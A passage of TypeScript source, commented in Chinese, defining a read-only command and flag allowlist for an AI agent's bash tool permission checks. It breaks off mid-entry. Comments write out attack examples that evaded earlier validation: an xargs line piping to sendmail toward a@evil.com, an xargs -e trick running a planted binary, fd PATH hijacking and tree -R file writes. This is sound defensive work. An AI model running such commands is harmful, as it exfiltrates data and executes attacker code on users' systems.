import type { z } from 'zod/v4'
import { getOriginalCwd } from '../../bootstrap/state.js'
import {
  extractOutputRedirections,
  splitCommand_DEPRECATED,
} from '../../utils/bash/commands.js'
import { tryParseShellCommand } from '../../utils/bash/shellQuote.js'
import { getCwd } from '../../utils/cwd.js'
import { isCurrentDirectoryBareGitRepo } from '../../utils/git.js'
import type { PermissionResult } from '../../utils/permissions/PermissionResult.js'
import { getPlatform } from '../../utils/platform.js'
import { SandboxManager } from '../../utils/sandbox/sandbox-adapter.js'
import {
  containsVulnerableUncPath,
  DOCKER_READ_ONLY_COMMANDS,
  EXTERNAL_READONLY_COMMANDS,
  type FlagArgType,
  GH_READ_ONLY_COMMANDS,
  GIT_READ_ONLY_COMMANDS,
  PYRIGHT_READ_ONLY_COMMANDS,
  RIPGREP_READ_ONLY_COMMANDS,
  validateFlags,
} from '../../utils/shell/readOnlyCommandValidation.js'
import type { BashTool } from './BashTool.js'
import { isNormalizedGitCommand } from './bashPermissions.js'
import { bashCommandIsSafe_DEPRECATED } from './bashSecurity.js'
import {
  COMMAND_OPERATION_TYPE,
  PATH_EXTRACTORS,
  type PathCommand,
} from './pathValidation.js'
import { sedCommandIsAllowedByAllowlist } from './sedValidation.js'

// 统一的命令校验配置系统
type CommandConfig = {
  // 从命令（例如 `xargs` 或 `git diff`）到其安全旗标及可取值的映射 Record
  safeFlags: Record<string, FlagArgType>
  // 用于旗标解析之外附加校验的可选正则表达式
  regex?: RegExp
  // 用于附加自定义校验逻辑的可选回调。若命令危险返回 true，
  // 若看起来安全返回 false。旨在与基于 safeFlags 的校验配合使用。
  additionalCommandIsDangerousCallback?: (
    rawCommand: string,
    args: string[],
  ) => boolean
  // 为 false 时，工具不遵守 POSIX `--` 选项结束标记。
  // validateFlags 会继续检查 `--` 之后的旗标，而不是中断。
  // 默认：true（大多数工具遵守 `--`）。
  respectsDoubleDash?: boolean
}

// fd 与 fdfind（Debian/Ubuntu 包名）共享的安全旗标
// 安全：-x/--exec 与 -X/--exec-batch 被刻意排除——
// 它们会为每个搜索结果执行任意命令。
const FD_SAFE_FLAGS: Record<string, FlagArgType> = {
  '-h': 'none',
  '--help': 'none',
  '-V': 'none',
  '--version': 'none',
  '-H': 'none',
  '--hidden': 'none',
  '-I': 'none',
  '--no-ignore': 'none',
  '--no-ignore-vcs': 'none',
  '--no-ignore-parent': 'none',
  '-s': 'none',
  '--case-sensitive': 'none',
  '-i': 'none',
  '--ignore-case': 'none',
  '-g': 'none',
  '--glob': 'none',
  '--regex': 'none',
  '-F': 'none',
  '--fixed-strings': 'none',
  '-a': 'none',
  '--absolute-path': 'none',
  // 安全：-l/--list-details 被排除——内部会作为子进程执行 `ls`（与
  // --exec-batch 相同的通路）。若 PATH 上存在恶意 `ls`，有 PATH 劫持风险。
  '-L': 'none',
  '--follow': 'none',
  '-p': 'none',
  '--full-path': 'none',
  '-0': 'none',
  '--print0': 'none',
  '-d': 'number',
  '--max-depth': 'number',
  '--min-depth': 'number',
  '--exact-depth': 'number',
  '-t': 'string',
  '--type': 'string',
  '-e': 'string',
  '--extension': 'string',
  '-S': 'string',
  '--size': 'string',
  '--changed-within': 'string',
  '--changed-before': 'string',
  '-o': 'string',
  '--owner': 'string',
  '-E': 'string',
  '--exclude': 'string',
  '--ignore-file': 'string',
  '-c': 'string',
  '--color': 'string',
  '-j': 'number',
  '--threads': 'number',
  '--max-buffer-time': 'string',
  '--max-results': 'number',
  '-1': 'none',
  '-q': 'none',
  '--quiet': 'none',
  '--show-errors': 'none',
  '--strip-cwd-prefix': 'none',
  '--one-file-system': 'none',
  '--prune': 'none',
  '--search-path': 'string',
  '--base-directory': 'string',
  '--path-separator': 'string',
  '--batch-size': 'number',
  '--no-require-git': 'none',
  '--hyperlink': 'string',
  '--and': 'string',
  '--format': 'string',
}

// 基于 allowlist 的命令校验中心配置
// 这里的所有命令与旗标应仅允许读取文件。它们不应
// 允许写入文件、执行代码或发起网络请求。
const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
  xargs: {
    safeFlags: {
      '-I': '{}',
      // 安全：`-i` 与 `-e`（小写）已移除——两者都使用 GNU getopt
      // 的可选附加参数语义（`i::`、`e::`）。参数必须
      // 附加（`-iX`、`-eX`）；空格分隔（`-i X`、`-e X`）意味着
      // 旗标不取参数，`X` 成为下一个位置参数（目标命令）。
      //
      // `-i`（`i::` —— 可选的 replace-str）：
      //   echo /usr/sbin/sendm | xargs -it tail a@evil.com
      //   校验器：-it 捆绑（两者都不是 'none'）OK，tail ∈ SAFE_TARGET → break
      //   GNU：-i replace-str=t，tail → /usr/sbin/sendmail → 网络外传
      //
      // `-e`（`e::` —— 可选的 eof-str）：
      //   cat data | xargs -e EOF echo foo
      //   校验器：-e 消费 'EOF' 作为参数（类型 'EOF'），echo ∈ SAFE_TARGET
      //   GNU：-e 无附加参数 → 无 eof-str，'EOF' 是目标命令
      //   → 从 PATH 执行名为 EOF 的二进制 → 代码执行（恶意仓库）
      //
      // 改用大写 `-I {}`（必选参数）和 `-E EOF`（POSIX，必选
      // 参数）——校验器与 xargs 在参数消费上一致。
      // `-i`/`-e` 已弃用（GNU：“use -I instead”/“use -E instead”）。
      '-n': 'number',
      '-P': 'number',
      '-L': 'number',
      '-s': 'number',
      '-E': 'EOF', // POSIX，必选独立参数——校验器与 xargs 一致
      '-0': 'none',
      '-t': 'none',
      '-r': 'none',
      '-x': 'none',
      '-d': 'char',
    },
  },
  // 来自共享校验映射的所有 git 只读命令
  ...GIT_READ_ONLY_COMMANDS,
  file: {
    safeFlags: {
      // 输出格式标志
      '--brief': 'none',
      '-b': 'none',
      '--mime': 'none',
      '-i': 'none',
      '--mime-type': 'none',
      '--mime-encoding': 'none',
      '--apple': 'none',
      // 行为标志
      '--check-encoding': 'none',
      '-c': 'none',
      '--exclude': 'string',
      '--exclude-quiet': 'string',
      '--print0': 'none',
      '-0': 'none',
      '-f': 'string',
      '-F': 'string',
      '--separator': 'string',
      '--help': 'none',
      '--version': 'none',
      '-v': 'none',
      // 跟随/解引用
      '--no-dereference': 'none',
      '-h': 'none',
      '--dereference': 'none',
      '-L': 'none',
      // magic 文件选项（仅读取时安全）
      '--magic-file': 'string',
      '-m': 'string',
      // 其他安全选项
      '--keep-going': 'none',
      '-k': 'none',
      '--list': 'none',
      '-l': 'none',
      '--no-buffer': 'none',
      '-n': 'none',
      '--preserve-date': 'none',
      '-p': 'none',
      '--raw': 'none',
      '-r': 'none',
      '-s': 'none',
      '--special-files': 'none',
      // 归档文件的解压标志
      '--uncompress': 'none',
      '-z': 'none',
    },
  },
  sed: {
    safeFlags: {
      // 表达式标志
      '--expression': 'string',
      '-e': 'string',
      // 输出控制
      '--quiet': 'none',
      '--silent': 'none',
      '-n': 'none',
      // 扩展正则
      '--regexp-extended': 'none',
      '-r': 'none',
      '--posix': 'none',
      '-E': 'none',
      // 行处理
      '--line-length': 'number',
      '-l': 'number',
      '--zero-terminated': 'none',
      '-z': 'none',
      '--separate': 'none',
      '-s': 'none',
      '--unbuffered': 'none',
      '-u': 'none',
      // 调试/帮助
      '--debug': 'none',
      '--help': 'none',
      '--version': 'none',
    },
    additionalCommandIsDangerousCallback: (
      rawCommand: string,
      _args: string[],
    ) => !sedCommandIsAllowedByAllowlist(rawCommand),
  },
  sort: {
    safeFlags: {
      // 排序选项
      '--ignore-leading-blanks': 'none',
      '-b': 'none',
      '--dictionary-order': 'none',
      '-d': 'none',
      '--ignore-case': 'none',
      '-f': 'none',
      '--general-numeric-sort': 'none',
      '-g': 'none',
      '--human-numeric-sort': 'none',
      '-h': 'none',
      '--ignore-nonprinting': 'none',
      '-i': 'none',
      '--month-sort': 'none',
      '-M': 'none',
      '--numeric-sort': 'none',
      '-n': 'none',
      '--random-sort': 'none',
      '-R': 'none',
      '--reverse': 'none',
      '-r': 'none',
      '--sort': 'string',
      '--stable': 'none',
      '-s': 'none',
      '--unique': 'none',
      '-u': 'none',
      '--version-sort': 'none',
      '-V': 'none',
      '--zero-terminated': 'none',
      '-z': 'none',
      // 键规格
      '--key': 'string',
      '-k': 'string',
      '--field-separator': 'string',
      '-t': 'string',
      // 校验
      '--check': 'none',
      '-c': 'none',
      '--check-char-order': 'none',
      '-C': 'none',
      // 合并
      '--merge': 'none',
      '-m': 'none',
      // 缓冲区大小
      '--buffer-size': 'string',
      '-S': 'string',
      // 并行处理
      '--parallel': 'number',
      // 批大小
      '--batch-size': 'number',
      // 帮助和版本
      '--help': 'none',
      '--version': 'none',
    },
  },
  man: {
    safeFlags: {
      // 安全的显示选项
      '-a': 'none', // 显示所有手册页
      '--all': 'none', // 等同于 -a
      '-d': 'none', // 调试模式
      '-f': 'none', // 模拟 whatis
      '--whatis': 'none', // 等同于 -f
      '-h': 'none', // 帮助
      '-k': 'none', // 模拟 apropos
      '--apropos': 'none', // 等同于 -k
      '-l': 'string', // 本地文件（读取安全，仅 Linux）
      '-w': 'none', // 显示位置而非内容

      // 安全的格式化选项
      '-S': 'string', // 限定手册章节
      '-s': 'string', // 在 whatis/apropos 模式下等同于 -S
    },
  },
  // help 命令 —— 只允许 bash 内建 help 的标志，以防
  // help 被别名为 man 时遭到攻击（例如在 oh-my-zsh 的 common-aliases 插件中）。
  // man 的 -P 标志允许通过分页器执行任意命令。
  help: {
    safeFlags: {
      '-d': 'none', // 为每个主题输出简短描述
      '-m': 'none', // 以伪手册页格式显示用法
      '-s': 'none', // 仅输出简短的用法概要
    },
  },
  netstat: {
    safeFlags: {
      // 安全的显示选项
      '-a': 'none', // 显示所有套接字
      '-L': 'none', // 显示监听队列大小
      '-l': 'none', // 打印完整 IPv6 地址
      '-n': 'none', // 以数字形式显示网络地址

      // 安全的过滤选项
      '-f': 'string', // 地址族（inet、inet6、unix、vsock）

      // 安全的接口选项
      '-g': 'none', // 显示多播组成员关系
      '-i': 'none', // 显示接口状态
      '-I': 'string', // 指定接口

      // 安全的统计选项
      '-s': 'none', // 显示按协议划分的统计信息

      // 安全的路由选项
      '-r': 'none', // 显示路由表

      // 安全的 mbuf 选项
      '-m': 'none', // 显示内存管理统计信息

      // 其他安全选项
      '-v': 'none', // 增加详细程度
    },
  },
  ps: {
    safeFlags: {
      // UNIX 风格的进程选择（这些是安全的）
      '-e': 'none', // 选择所有进程
      '-A': 'none', // 选择所有进程（等同于 -e）
      '-a': 'none', // 选择所有带 tty 的进程，但排除会话首进程
      '-d': 'none', // 选择所有进程，但排除会话首进程
      '-N': 'none', // 取反选择
      '--deselect': 'none',

      // UNIX 风格的输出格式（安全，不显示环境变量）
      '-f': 'none', // 完整格式
      '-F': 'none', // 额外完整格式
      '-l': 'none', // 长格式
      '-j': 'none', // 作业格式
      '-y': 'none', // 不显示标志

      // 输出修饰符（安全的部分）
      '-w': 'none', // 宽输出
      '-ww': 'none', // 不限宽度
      '--width': 'number',
      '-c': 'none', // 显示调度器信息
      '-H': 'none', // 显示进程层级
      '--forest': 'none',
      '--headers': 'none',
      '--no-headers': 'none',
      '-n': 'string', // 设置 namelist 文件
      '--sort': 'string',

      // 线程显示
      '-L': 'none', // 显示线程
      '-T': 'none', // 显示线程
      '-m': 'none', // 在进程之后显示线程

      // 按条件选择进程
      '-C': 'string', // 按命令名
      '-G': 'string', // 按实际组 ID
      '-g': 'string', // 按会话或有效组
      '-p': 'string', // 按 PID
      '--pid': 'string',
      '-q': 'string', // 按 PID 的快速模式
      '--quick-pid': 'string',
      '-s': 'string', // 按会话 ID
      '--sid': 'string',
      '-t': 'string', // 按 tty
      '--tty': 'string',
      '-U': 'string', // 按实际用户 ID
      '-u': 'string', // 按有效用户 ID
      '--user': 'string',

      // 帮助/版本
      '--help': 'none',
      '--info': 'none',
      '-V': 'none',
      '--version': 'none',
    },
    // 阻止会显示环境变量的 BSD 风格 'e' 修饰符
    // BSD 选项是仅由字母组成、不带前导短横线的 token
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // 检查仅由字母组成的 token 中是否存在 BSD 风格的 'e'（不是 UNIX 风格的 -e）
      // BSD 风格选项是仅由字母组成（无前导短横线）且包含 'e' 的 token
      return args.some(
        a => !a.startsWith('-') && /^[a-zA-Z]*e[a-zA-Z]*$/.test(a),
      )
    },
  },
  base64: {
    respectsDoubleDash: false, // macOS 的 base64 不遵循 POSIX 的 --
    safeFlags: {
      // 安全的解码选项
      '-d': 'none', // 解码
      '-D': 'none', // 解码（macOS）
      '--decode': 'none', // 解码

      // 安全的格式化选项
      '-b': 'number', // 在第 num 列换行（macOS）
      '--break': 'number', // 在第 num 列换行（macOS）
      '-w': 'number', // 在第 COLS 列折行（Linux）
      '--wrap': 'number', // 在第 COLS 列折行（Linux）

      // 安全的输入选项（从文件读取，不写入）
      '-i': 'string', // 输入文件（读取安全）
      '--input': 'string', // 输入文件（读取安全）

      // 其他安全选项
      '--ignore-garbage': 'none', // 解码时忽略非字母字符（Linux）
      '-h': 'none', // 帮助
      '--help': 'none', // 帮助
      '--version': 'none', // 版本
    },
  },
  grep: {
    safeFlags: {
      // 模式标志
      '-e': 'string', // 模式
      '--regexp': 'string',
      '-f': 'string', // 包含模式的文件
      '--file': 'string',
      '-F': 'none', // 固定字符串
      '--fixed-strings': 'none',
      '-G': 'none', // 基本正则（默认）
      '--basic-regexp': 'none',
      '-E': 'none', // 扩展正则
      '--extended-regexp': 'none',
      '-P': 'none', // Perl 正则
      '--perl-regexp': 'none',

      // 匹配控制
      '-i': 'none', // 忽略大小写
      '--ignore-case': 'none',
      '--no-ignore-case': 'none',
      '-v': 'none', // 反向匹配
      '--invert-match': 'none',
      '-w': 'none', // 单词正则
      '--word-regexp': 'none',
      '-x': 'none', // 行正则
      '--line-regexp': 'none',

      // 输出控制
      '-c': 'none', // 计数
      '--count': 'none',
      '--color': 'string',
      '--colour': 'string',
      '-L': 'none', // 不含匹配的文件
      '--files-without-match': 'none',
      '-l': 'none', // 含匹配的文件
      '--files-with-matches': 'none',
      '-m': 'number', // 最大计数
      '--max-count': 'number',
      '-o': 'none', // 仅匹配部分
      '--only-matching': 'none',
      '-q': 'none', // 静默
      '--quiet': 'none',
      '--silent': 'none',
      '-s': 'none', // 不输出消息
      '--no-messages': 'none',

      // 输出行前缀
      '-b': 'none', // 字节偏移
      '--byte-offset': 'none',
      '-H': 'none', // 显示文件名
      '--with-filename': 'none',
      '-h': 'none', // 不显示文件名
      '--no-filename': 'none',
      '--label': 'string',
      '-n': 'none', // 行号
      '--line-number': 'none',
      '-T': 'none', // 起始制表符
      '--initial-tab': 'none',
      '-u': 'none', // Unix 字节偏移
      '--unix-byte-offsets': 'none',
      '-Z': 'none', // 文件名后输出 Null
      '--null': 'none',
      '-z': 'none', // Null 数据
      '--null-data': 'none',

      // 上下文控制
      '-A': 'number', // 后置上下文
      '--after-context': 'number',
      '-B': 'number', // 前置上下文
      '--before-context': 'number',
      '-C': 'number', // 上下文
      '--context': 'number',
      '--group-separator': 'string',
      '--no-group-separator': 'none',

      // 文件和目录选择
      '-a': 'none', // 文本（将二进制按文本处理）
      '--text': 'none',
      '--binary-files': 'string',
      '-D': 'string', // 设备
      '--devices': 'string',
      '-d': 'string', // 目录
      '--directories': 'string',
      '--exclude': 'string',
      '--exclude-from': 'string',
      '--exclude-dir': 'string',
      '--include': 'string',
      '-r': 'none', // 递归
      '--recursive': 'none',
      '-R': 'none', // 解引用递归
      '--dereference-recursive': 'none',

      // 其他选项
      '--line-buffered': 'none',
      '-U': 'none', // 二进制
      '--binary': 'none',

      // 帮助和版本
      '--help': 'none',
      '-V': 'none',
      '--version': 'none',
    },
  },
  ...RIPGREP_READ_ONLY_COMMANDS,
  // 校验和命令 —— 它们只读取文件并计算/验证哈希
  // 所有标志都是安全的，因为它们只影响输出格式或验证行为
  sha256sum: {
    safeFlags: {
      // 模式标志
      '-b': 'none', // 二进制模式
      '--binary': 'none',
      '-t': 'none', // 文本模式
      '--text': 'none',

      // 校验/验证标志
      '-c': 'none', // 从文件验证校验和
      '--check': 'none',
      '--ignore-missing': 'none', // 校验时忽略缺失的文件
      '--quiet': 'none', // 校验时静默模式
      '--status': 'none', // 不输出，以退出码表示成功
      '--strict': 'none', // 对格式不正确的行以非零码退出
      '-w': 'none', // 对格式不正确的行发出警告
      '--warn': 'none',

      // 输出格式标志
      '--tag': 'none', // BSD 风格输出
      '-z': 'none', // 以 NUL 结束输出行
      '--zero': 'none',

      // 帮助和版本
      '--help': 'none',
      '--version': 'none',
    },
  },
  sha1sum: {
    safeFlags: {
      // 模式标志
      '-b': 'none', // 二进制模式
      '--binary': 'none',
      '-t': 'none', // 文本模式
      '--text': 'none',

      // 校验/验证标志
      '-c': 'none', // 从文件验证校验和
      '--check': 'none',
      '--ignore-missing': 'none', // 校验时忽略缺失的文件
      '--quiet': 'none', // 校验时静默模式
      '--status': 'none', // 不输出，以退出码表示成功
      '--strict': 'none', // 对格式不正确的行以非零码退出
      '-w': 'none', // 对格式不正确的行发出警告
      '--warn': 'none',

      // 输出格式标志
      '--tag': 'none', // BSD 风格输出
      '-z': 'none', // 以 NUL 结束输出行
      '--zero': 'none',

      // 帮助和版本
      '--help': 'none',
      '--version': 'none',
    },
  },
  md5sum: {
    safeFlags: {
      // 模式标志
      '-b': 'none', // 二进制模式
      '--binary': 'none',
      '-t': 'none', // 文本模式
      '--text': 'none',

      // 校验/验证标志
      '-c': 'none', // 从文件验证校验和
      '--check': 'none',
      '--ignore-missing': 'none', // 校验时忽略缺失的文件
      '--quiet': 'none', // 校验时静默模式
      '--status': 'none', // 不输出，以退出码表示成功
      '--strict': 'none', // 对格式不正确的行以非零码退出
      '-w': 'none', // 对格式不正确的行发出警告
      '--warn': 'none',

      // 输出格式标志
      '--tag': 'none', // BSD 风格输出
      '-z': 'none', // 以 NUL 结束输出行
      '--zero': 'none',

      // 帮助和版本
      '--help': 'none',
      '--version': 'none',
    },
  },
  // tree 命令 —— 从 READONLY_COMMAND_REGEXES 移出，以允许标志和路径参数
  // -o/--output 会写入文件，因此被排除。其他所有标志都是显示/过滤选项。
  tree: {
    safeFlags: {
      // 列表选项
      '-a': 'none', // 所有文件
      '-d': 'none', // 仅目录
      '-l': 'none', // 跟随符号链接
      '-f': 'none', // 完整路径前缀
      '-x': 'none', // 停留在当前文件系统
      '-L': 'number', // 最大深度
      // 安全：已移除 -R。tree -R 与 -H（HTML 模式）和 -L（深度）组合时，
      // 会在深度边界处的每个子目录中写入 00Tree.html 文件。
      // 摘自 man tree（< 2.1.0）："-R —— 在它们每一个中再次执行 tree，
      // 并添加 `-o 00Tree.html` 作为新选项。" 注释 "在最大
      // 深度重新运行" 具有误导性 —— 所谓 "重新运行" 包含一次硬编码的 -o 文件写入。
      // `tree -R -H . -L 2 /path` → 为深度 2 的每个子目录
      // 写入 /path/<subdir>/00Tree.html。文件写入，零权限。
      '-P': 'string', // 包含模式
      '-I': 'string', // 排除模式
      '--gitignore': 'none',
      '--gitfile': 'string',
      '--ignore-case': 'none',
      '--matchdirs': 'none',
      '--metafirst': 'none',
      '--prune': 'none',
      '--info': 'none',
      '--infofile': 'string',
      '--noreport': 'none',
      '--charset': 'string',
      '--filelimit': 'number',
      // 文件显示选项
      '-q': 'none', // 不可打印字符显示为 ?
      '-N': 'none', // 不可打印字符原样输出
      '-Q': 'none', // 为文件名加引号
      '-p': 'none', // 保护
      '-u': 'none', // 所有者
      '-g': 'none', // 组
      '-s': 'none', // 大小（字节）
      '-h': 'none', // 人类可读的大小
      '--si': 'none',
      '--du': 'none',
      '-D': 'none', // 最后修改时间
      '--timefmt': 'string',
      '-F': 'none', // 追加指示符
      '--inodes': 'none',
      '--device': 'none',
      // 排序选项
      '-v': 'none', // 版本排序
      '-t': 'none', // 按 mtime 排序
      '-c': 'none', // 按 ctime 排序
      '-U': 'none', // 不排序
      '-r': 'none', // 反向排序
      '--dirsfirst': 'none',
      '--filesfirst': 'none',
      '--sort': 'string',
      // 图形/输出选项
      '-i': 'none', // 不显示缩进线
      '-A': 'none', // ANSI 线条图形
      '-S': 'none', // CP437 线条图形
      '-n': 'none', // 不使用颜色
      '-C': 'none', // 使用颜色
      '-X': 'none', // XML 输出
      '-J': 'none', // JSON 输出
      '-H': 'string', // 带基础 HREF 的 HTML 输出
      '--nolinks': 'none',
      '--hintro': 'string',
      '--houtro': 'string',
      '-T': 'string', // HTML 标题
      '--hyperlink': 'none',
      '--scheme': 'string',
      '--authority': 'string',
      // 输入选项（从文件读取，不写入）
      '--fromfile': 'none',
      '--fromtabfile': 'none',
      '--fflinks': 'none',
      // 帮助和版本
      '--help': 'none',
      '--version': 'none',
    },
  },
  // date 命令 —— 从 READONLY_COMMANDS 移出，因为 -s/--set 可设置系统时间
  // 另外 -f/--file 可用于从文件读取日期并设置时间
  // 我们只允许安全的显示选项
  date: {
    safeFlags: {
      // 显示选项（安全 —— 不会修改系统时间）
      '-d': 'string', // --date=STRING —— 显示由 STRING 描述的时间
      '--date': 'string',
      '-r': 'string', // --reference=FILE —— 显示文件的修改时间
      '--reference': 'string',
      '-u': 'none', // --utc —— 使用 UTC
      '--utc': 'none',
      '--universal': 'none',
      // 输出格式选项
      '-I': 'none', // --iso-8601（可带可选参数，但 none 类型已处理裸标志）
      '--iso-8601': 'string',
      '-R': 'none', // --rfc-email
      '--rfc-email': 'none',
      '--rfc-3339': 'string',
      // 调试/帮助
      '--debug': 'none',
      '--help': 'none',
      '--version': 'none',
    },
    // 危险标志未包含（通过省略来阻止）：
    // -s / --set —— 设置系统时间
    // -f / --file —— 从文件读取日期（可用于批量设置时间）
    // 关键：格式为 MMDDhhmm[[CC]YY][.ss] 的 date 位置参数会设置系统时间
    // 使用回调验证位置参数以 + 开头（格式字符串，如 +"%Y-%m-%d"）
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // args 已是 "date" 之后解析好的 token
      // 需要参数的标志
      const flagsWithArgs = new Set([
        '-d',
        '--date',
        '-r',
        '--reference',
        '--iso-8601',
        '--rfc-3339',
      ])
      let i = 0
      while (i < args.length) {
        const token = args[i]!
        // 跳过标志及其参数
        if (token.startsWith('--') && token.includes('=')) {
          // 带 =value 的长标志，已消费
          i++
        } else if (token.startsWith('-')) {
          // 标志 —— 检查它是否接受参数
          if (flagsWithArgs.has(token)) {
            i += 2 // 跳过标志及其参数
          } else {
            i++ // 仅跳过该标志
          }
        } else {
          // 位置参数 —— 对于格式字符串必须以 + 开头
          // 其他任何内容（如 MMDDhhmm）都可能设置系统时间
          if (!token.startsWith('+')) {
            return true // 危险
          }
          i++
        }
      }
      return false // 安全
    },
  },
  // hostname 命令 —— 从 READONLY_COMMANDS 移出，因为位置参数会设置主机名
  // 另外 -F/--file 从文件设置主机名，-b/--boot 设置默认主机名
  // 我们只允许安全的显示选项，并阻止任何位置参数
  hostname: {
    safeFlags: {
      // 仅显示选项（安全）
      '-f': 'none', // --fqdn —— 显示 FQDN
      '--fqdn': 'none',
      '--long': 'none',
      '-s': 'none', // --short —— 显示短名称
      '--short': 'none',
      '-i': 'none', // --ip-address
      '--ip-address': 'none',
      '-I': 'none', // --all-ip-addresses
      '--all-ip-addresses': 'none',
      '-a': 'none', // --alias
      '--alias': 'none',
      '-d': 'none', // --domain
      '--domain': 'none',
      '-A': 'none', // --all-fqdns
      '--all-fqdns': 'none',
      '-v': 'none', // --verbose
      '--verbose': 'none',
      '-h': 'none', // --help
      '--help': 'none',
      '-V': 'none', // --version
      '--version': 'none',
    },
    // 关键：阻止任何位置参数 —— 它们会设置主机名
    // 同时阻止 -F/--file、-b/--boot、-y/--yp/--nis（不在 safeFlags 中 = 被阻止）
    // 使用正则确保标志之后没有位置参数
    regex: /^hostname(?:\s+(?:-[a-zA-Z]|--[a-zA-Z-]+))*\s*$/,
  },
  // info 命令 —— 从 READONLY_COMMANDS 移出，因为 -o/--output 会写入文件
  // 另外 --dribble 会把按键记录写入文件，--init-file 会加载自定义配置
  // 我们只允许安全的显示/导航选项
  info: {
    safeFlags: {
      // 导航/显示选项（安全）
      '-f': 'string', // --file —— 指定要读取的手册文件
      '--file': 'string',
      '-d': 'string', // --directory —— 搜索路径
      '--directory': 'string',
      '-n': 'string', // --node —— 指定节点
      '--node': 'string',
      '-a': 'none', // --all
      '--all': 'none',
      '-k': 'string', // --apropos —— 搜索
      '--apropos': 'string',
      '-w': 'none', // --where —— 显示位置
      '--where': 'none',
      '--location': 'none',
      '--show-options': 'none',
      '--vi-keys': 'none',
      '--subnodes': 'none',
      '-h': 'none',
      '--help': 'none',
      '--usage': 'none',
      '--version': 'none',
    },
    // 危险标志未包含（通过省略来阻止）：
    // -o / --output —— 将输出写入文件
    // --dribble —— 将按键记录到文件
    // --init-file —— 加载自定义配置（可能执行代码）
    // --restore —— 从文件回放按键
  },

  lsof: {
    safeFlags: {
      '-?': 'none',
      '-h': 'none',
      '-v': 'none',
      '-a': 'none',
      '-b': 'none',
      '-C': 'none',
      '-l': 'none',
      '-n': 'none',
      '-N': 'none',
      '-O': 'none',
      '-P': 'none',
      '-Q': 'none',
      '-R': 'none',
      '-t': 'none',
      '-U': 'none',
      '-V': 'none',
      '-X': 'none',
      '-H': 'none',
      '-E': 'none',
      '-F': 'none',
      '-g': 'none',
      '-i': 'none',
      '-K': 'none',
      '-L': 'none',
      '-o': 'none',
      '-r': 'none',
      '-s': 'none',
      '-S': 'none',
      '-T': 'none',
      '-x': 'none',
      '-A': 'string',
      '-c': 'string',
      '-d': 'string',
      '-e': 'string',
      '-k': 'string',
      '-p': 'string',
      '-u': 'string',
      // 已省略（会写入磁盘）：-D（设备缓存文件的构建/更新）
    },
    // 阻止 +m（创建挂载补充文件）—— 会写入磁盘。
    // + 前缀标志会被 validateFlags 视为位置参数，
    // 因此我们必须在此处捕获它们。lsof 接受 +m<path>（附加路径，无空格），
    // 绝对路径（+m/tmp/evil）和相对路径（+mfoo、+m.evil）均可。
    additionalCommandIsDangerousCallback: (_rawCommand, args) =>
      args.some(a => a === '+m' || a.startsWith('+m')),
  },

  pgrep: {
    safeFlags: {
      '-d': 'string',
      '--delimiter': 'string',
      '-l': 'none',
      '--list-name': 'none',
      '-a': 'none',
      '--list-full': 'none',
      '-v': 'none',
      '--inverse': 'none',
      '-w': 'none',
      '--lightweight': 'none',
      '-c': 'none',
      '--count': 'none',
      '-f': 'none',
      '--full': 'none',
      '-g': 'string',
      '--pgroup': 'string',
      '-G': 'string',
      '--group': 'string',
      '-i': 'none',
      '--ignore-case': 'none',
      '-n': 'none',
      '--newest': 'none',
      '-o': 'none',
      '--oldest': 'none',
      '-O': 'string',
      '--older': 'string',
      '-P': 'string',
      '--parent': 'string',
      '-s': 'string',
      '--session': 'string',
      '-t': 'string',
      '--terminal': 'string',
      '-u': 'string',
      '--euid': 'string',
      '-U': 'string',
      '--uid': 'string',
      '-x': 'none',
      '--exact': 'none',
      '-F': 'string',
      '--pidfile': 'string',
      '-L': 'none',
      '--logpidfile': 'none',
      '-r': 'string',
      '--runstates': 'string',
      '--ns': 'string',
      '--nslist': 'string',
      '--help': 'none',
      '-V': 'none',
      '--version': 'none',
    },
  },

  tput: {
    safeFlags: {
      '-T': 'string',
      '-V': 'none',
      '-x': 'none',
      // 安全：-S（从 stdin 读取能力名称）被有意排除。
      // 它绝不能出现在 safeFlags 中，因为 validateFlags 会拆分组合的
      // 短标志（例如 -xS → -x + -S），但回调接收到的是原始
      // token '-xS'，且只检查精确匹配 'token === "-S"'。将 -S
      // 排除出 safeFlags 可确保 validateFlags 在回调运行之前就拒绝它
      //（无论是否捆绑）。回调中的 -S 检查是纵深防御。
    },
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // 会修改终端状态或可能有害的能力。
      // init/reset 会运行 iprog（来自 terminfo 的任意代码）并修改 tty 设置。
      // rs1/rs2/rs3/is1/is2/is3 是 init/reset 内部调用的
      // 各个重置/初始化序列 —— rs1 发送 ESC c（完全终端重置）。
      // clear 会清除回滚缓冲区（销毁证据）。mc5/mc5p 激活媒体复制
      //（将输出重定向到打印机设备）。smcup/rmcup 会操纵屏幕缓冲区。
      // pfkey/pfloc/pfx/pfxl 会编程功能键 —— pfloc 会在本地执行字符串。
      // rf 是重置文件（类似于 if/init_file）。
      const DANGEROUS_CAPABILITIES = new Set([
        'init',
        'reset',
        'rs1',
        'rs2',
        'rs3',
        'is1',
        'is2',
        'is3',
        'iprog',
        'if',
        'rf',
        'clear',
        'flash',
        'mc0',
        'mc4',
        'mc5',
        'mc5i',
        'mc5p',
        'pfkey',
        'pfloc',
        'pfx',
        'pfxl',
        'smcup',
        'rmcup',
      ])
      const flagsWithArgs = new Set(['-T'])
      let i = 0
      let afterDoubleDash = false
      while (i < args.length) {
        const token = args[i]!
        if (token === '--') {
          afterDoubleDash = true
          i++
        } else if (!afterDoubleDash && token.startsWith('-')) {
          // 纵深防御：即使 -S 以某种方式通过了 validateFlags，也要阻止它
          if (token === '-S') return true
          // 同时检查与其他标志捆绑的 -S（例如 -xS）
          if (
            !token.startsWith('--') &&
            token.length > 2 &&
            token.includes('S')
          )
            return true
          if (flagsWithArgs.has(token)) {
            i += 2
          } else {
            i++
          }
        } else {
          if (DANGEROUS_CAPABILITIES.has(token)) return true
          i++
        }
      }
      return false
    },
  },

  // ss —— 套接字统计（iproute2）。等同于 netstat 的只读查询工具。
  // 安全：-K/--kill（强制关闭套接字）和 -D/--diag（将原始数据转储到文件）
  // 被有意排除。-F/--filter（从文件读取过滤器）也被排除。
  ss: {
    safeFlags: {
      '-h': 'none',
      '--help': 'none',
      '-V': 'none',
      '--version': 'none',
      '-n': 'none',
      '--numeric': 'none',
      '-r': 'none',
      '--resolve': 'none',
      '-a': 'none',
      '--all': 'none',
